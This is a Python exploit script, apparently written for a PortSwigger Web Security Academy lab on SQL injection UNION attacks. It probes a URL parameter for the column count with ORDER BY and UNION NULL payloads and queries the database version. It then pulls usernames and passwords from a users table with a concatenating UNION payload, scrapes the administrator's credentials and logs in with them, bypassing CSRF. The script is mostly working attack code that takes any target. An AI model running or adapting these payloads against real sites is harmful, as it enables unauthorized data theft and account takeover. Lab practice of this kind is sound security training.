import requests
import sys
import urllib3
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import signal

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

""" 06_multivalcreds.py #########################################################
Lab: SQL injection UNION attack, retrieving multiple values in a single column
https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww """


def get_csrf_token(sess, url):
    try:
        req = sess.get(url, verify=False, proxies=proxies)
        # Check the HTML to see where to parse the CSRF from.
        beau_soup = BeautifulSoup(req.text, 'html.parser')
        # Find the first input element and get its value.
        csrf = beau_soup.find("input")['value']
        return csrf
    except Exception as e:
        template = "An exception of type {0} occurred. Arguments:\n{1!r}"
        message = template.format(type(e).__name__, e.args)     
        if type(e).__name__ == 'ProxyError':
            print("Error Type: ProxyError. Check the proxy.")
        else:    
            print('Error Return Type: ', type(e))
            

""" column_number(payload_type, url, path_param) ###############################

############################################################################ """
def column_number(payload_type, url, path_param):
    # Run exploit with ORDER BY clause.
    if payload_type == "orderby":
        print("[+] Using the ORDER BY clause.")
        print("[+] Figuring out number of columns...")
        for i in range(1,25):
            # Assemble payload.
            sql_payload = "'+order+by+%s--" %i
            print(f"{i} : {sql_payload}")
            # sql_payload = "{}%s{}".format(payload[0], payload[1]) %i
            # Get request with payload.
            r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
            # Get the text from the request.
            res = r.text
            # If Internal Server Error is found in the text, column is the previous index. 
            if "Internal Server Error" in res:
                print(f"{i} : Internal Server Error hits at column {i}.")
                # Subtract 1 from where index stopped to get number of columns.
                return i - 1
        return False
    # Run exploit with UNION operation.
    elif payload_type == "union":
        print("[+] Using a UNION operation.")
        print("[+] Figuring out number of columns...")
        sql_payload = "'+UNION+select+NULL--"
        text = ",+NULL"
        substr = "--"
        index = sql_payload.index(substr)
        union = False
        for i in range(1,25):
            # Count the number of NULL.
            num = sql_payload.count("NULL")
            # If current index is first NULL, run it for the first time.
            if num == 1 and union == False:
                print(f"{i} : {sql_payload}")
                # Get request with first payload.
                r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
                # Get the text from the request.
                res = r.text
                # Assemble Payload and add another NULL
                sql_payload = sql_payload[:index] + text + sql_payload[index:]
                # If UNION select is printed in HTML on first index, return column number.
                if "UNION select" in res:
                    return i
            # If current index passed first NULL, keep adding NULL to string. 
            elif num > 1 and union == False:
                    print(f"{i} : {sql_payload}")
                    sql_payload = sql_payload[:index] + text + sql_payload[index:]
                    r = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
                    res = r.text
                    if "UNION select" in res:
                        union = True
            # If current index passed first NULL and union is true, the column has been found.
            elif num > 1 and union == True:
                print(f"{i} : {sql_payload}")
                print(f"{i} : UNION select printed in HTML at column {i}.")
                return i
        return False


def get_sql_version(url, path_param):
    # Get request with payload.
    sql_payload_postgres = "' UNION select NULL, version()--"
    req = requests.get(url + path_param + sql_payload_postgres, verify=False, proxies=proxies)
    # req_error_check = req.text
    soup = BeautifulSoup(req.text, 'html.parser')
    table_rows = soup.find_all('tr')
    # Loop through table rows and check for admin username.
    for tr in table_rows:
        # if "Internal Server Error" in req_error_check:
        #     print(f"{i} : Internal Server Error hits at column {i}.")
        if 'PostgreSQL' in tr.text:
            # If Database version is found in the HTML, put them in a list.
            print("[+] Database version found...")
            print(tr.get_text())


""" exploit_sqli_creds(sess, num_col, url, path_param) ########################
Loop though the column numbers, test each request for SQLi and check the HTML 
for when the query text matches, run the SQLi and check for credentials, then
log in with the credentials.
############################################################################ """
def exploit_sqli_creds(sess, num_col, url, path_param):
    # Get the token before attempting to log in after converting it to the correct URL.
    login_url = urljoin(url, urlparse(url).path) + "/login"
    csrf = get_csrf_token(sess, login_url)
    print("CSRF token acquired: ", csrf)
    print("[+] Testing if payload is getting injected into HTML")
    # It's done (stop) when we reach the number of columns and set an index.
    stop = num_col
    idx = 0
    # Loop through the number of columns and test data type.
    for i in range(1, num_col+1):
        # Set up the payloads.
        string = "'a'"
        columns = 'NULL' * (num_col-1)
        payload_list = [string]
        payload_list.append(columns)
        payload_list[i-1] = string
        sql_payload = "' union select " + ', '.join(payload_list) + "--"
        print(f"Sending payload: {i}")
        print(i, ": ", sql_payload)
        # Get request with payload.
        req = requests.get(url + path_param + sql_payload, verify=False, proxies=proxies)
        soup = BeautifulSoup(req.text, 'html.parser')
        # Get the HTML where the payload is injected into.
        response = soup.find_all('section', attrs={'class':'ecoms-pageheader'})
        uni = "union select"
        # Check inside HTML for each payload.
        for res in response:
            temp = res.get_text(' ', strip=True)
            if uni in temp:
                print("[-] UNION found in HTML:")
                print(res)
            else:
                print("[+] UNION not found in HTML")

        idx = idx + 1   
        # Starting SQL Injection and attempting to log in as administrator.
        if idx == stop:
            print(idx, ": Starting SQL Injection...")
            #sql_payload2 = "' UNION select username, password from users--"
            sql_payload2 = "' UNION select NULL, username || '*' || password from users--"
            # Get request with the final payload that should reveal the credentials.
            req = requests.get(url + path_param + sql_payload2, verify=False, proxies=proxies)
            soup = BeautifulSoup(req.text, 'html.parser')
            table_rows = soup.find_all('tr')
            # Loop through table rows and check for admin username.
            for tr in table_rows:
                if 'administrator' in tr.text:
                    # If credentials are found in the HTML, put them in a list.
                    print("[+] Administrator username and password found in this tr tag!")
                    print(tr.get_text())
                    # Remove new line or spaces.
                    creds = tr.get_text().strip()
                    # Split username and password with the asterisk.
                    creds = creds.split('*')
                    creds = list(filter(None, creds))
                    # Setup the data for logging in.
                    data = {"csrf": csrf, "username": creds[0], "password": creds[1]}
                    print(data)
                    # Send a POST request and log in with credentials.
                    try:
                        req = sess.post(login_url, data=data, verify=False, proxies=proxies)
                        # Check if the request logged in by looking in the response text.
                        # If true, it means the exploit worked as intended.
                        res = req.text
                        if 'administrator' in res:
                            print("Logged in as administrator")
                            return True
                        else:
                            print("Can't log in")
                            return False
                    except Exception as e:
                        print('Error Return Type: ', type(e))                    
                    #return True
                else:
                    print("[-] Administrator not found in this tr...")
    return False


def signal_handler(sig, frame):
    print("\n[+] Exploit aborted with Ctrl-c.")
    # Run any clean up commands here.
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)

if __name__ == "__main__":
    try:
        payload_type = sys.argv[1].strip()
        url = sys.argv[2].strip()
        path_param = sys.argv[3].strip()
    except IndexError:
        print("[-] Usage: %s <payload_type> <url> <path_param>" % sys.argv[0])
        print('[-] Example: %s orderby https://website.net "/filter?category=Gifts"' % sys.argv[0])
        print('[-] Example: %s union https://website.net "/filter?category=Gifts"' % sys.argv[0])
        sys.exit(-1)

    # get_sql_version(url, path_param)
    num_col = column_number(payload_type, url, path_param)
    if num_col:
        print("[+] The number of columns is " + str(num_col) + "." )
        print("[+] Figuring out which columns contain text and extracting creds...")
        sess = requests.Session()
        extract_creds = exploit_sqli_creds(sess, num_col, url, path_param)
        if extract_creds:
            print("[-] The SQLi was successful...")
        else:
            print("[-] Can't extract the username and password.")
    else:
        print("[-] The SQLi was not successful...")
